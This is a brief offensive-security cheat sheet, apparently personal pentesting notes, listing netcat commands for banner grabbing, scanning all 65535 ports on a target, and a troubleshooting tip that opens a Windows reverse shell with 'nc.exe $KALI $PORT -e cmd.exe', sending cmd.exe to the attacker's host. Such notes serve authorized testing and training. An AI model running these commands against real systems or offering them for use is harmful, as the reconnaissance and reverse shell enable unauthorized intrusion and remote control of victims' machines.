Banner grabbing
```bash - kali
echo "" | nc -vv -n -w1 $TARGET $PORT
```
#### NC port scanner
```bash
nc -v -n -w2 -z $TARGET 1-65535 2>&1 | grep succeeded
```
#### Rev Shell stuck
If stuck on: `Connection received`, add the -e option:
```
nc.exe $KALI $PORT -e C:\Windows\System32\cmd.exe
```
